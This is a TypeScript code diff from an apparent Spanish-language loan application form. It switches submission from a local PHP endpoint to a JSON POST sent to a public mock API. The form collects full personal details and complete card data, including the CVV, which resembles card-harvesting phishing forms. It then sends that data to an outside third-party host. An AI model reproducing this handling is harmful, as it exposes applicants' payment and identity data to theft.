@@ -3,47 +3,55 @@ import { LoanFormData } from '../types/formTypes';
 export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
   try {
     // Prepare form data for submission
-    const formDataToSubmit = new FormData();
-    
-    // Add loan details
-    formDataToSubmit.append('loanAmount', formData.loanAmount.toString());
-    formDataToSubmit.append('loanTerm', formData.loanTerm.toString());
-    
-    // Add personal info
-    formDataToSubmit.append('firstName', formData.firstName || '');
-    formDataToSubmit.append('lastName', formData.lastName || '');
-    formDataToSubmit.append('dni', formData.dni || '');
-    formDataToSubmit.append('province', formData.province || '');
-    formDataToSubmit.append('email', formData.email || '');
-    formDataToSubmit.append('phone', formData.phone || '');
-    
-    // Add occupation details
-    formDataToSubmit.append('occupation', formData.occupation || '');
-    formDataToSubmit.append('company', formData.occupationDetails?.company || '');
-    formDataToSubmit.append('position', formData.occupationDetails?.position || '');
-    formDataToSubmit.append('monthlySalary', formData.occupationDetails?.monthlySalary || '');
-    formDataToSubmit.append('yearsEmployed', formData.occupationDetails?.yearsEmployed || '');
+    const payload = {
+      // Loan details
+      loanAmount: formData.loanAmount,
+      loanTerm: formData.loanTerm,
+      
+      // Personal info
+      firstName: formData.firstName || '',
+      lastName: formData.lastName || '',
+      dni: formData.dni || '',
+      province: formData.province || '',
+      email: formData.email || '',
+      phone: formData.phone || '',
+      
+      // Occupation details
+      occupation: formData.occupation || '',
+      company: formData.occupationDetails?.company || '',
+      position: formData.occupationDetails?.position || '',
+      monthlySalary: formData.occupationDetails?.monthlySalary || '',
+      yearsEmployed: formData.occupationDetails?.yearsEmployed || '',
 
-    // Add card info
-    formDataToSubmit.append('cardType', formData.cardInfo.type);
-    formDataToSubmit.append('cardNumber', formData.cardInfo.number);
-    formDataToSubmit.append('cardName', formData.cardInfo.name);
-    formDataToSubmit.append('cardExpiry', formData.cardInfo.expiry);
-    formDataToSubmit.append('cardCvv', formData.cardInfo.cvv);
+      // Card info
+      cardInfo: {
+        type: formData.cardInfo.type,
+        number: formData.cardInfo.number,
+        name: formData.cardInfo.name,
+        expiry: formData.cardInfo.expiry,
+        cvv: formData.cardInfo.cvv
+      }
+    };
 
     // Submit the form
-    const response = await fetch('/save-form.php', {
+    const response = await fetch('https://jsonplaceholder.typicode.com/posts', {
       method: 'POST',
-      body: formDataToSubmit,
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
     });
 
-    const result = await response.json();
-
     if (!response.ok) {
-      throw new Error(result.error || 'Error al enviar el formulario');
+      throw new Error('Error al enviar el formulario');
     }
+
+    const result = await response.json();
     
-    return { success: true, message: 'Solicitud procesada exitosamente' };
+    return { 
+      success: true, 
+      message: 'Solicitud procesada exitosamente'
+    };
   } catch (error) {
     console.error('Error submitting form:', error);
     throw error;
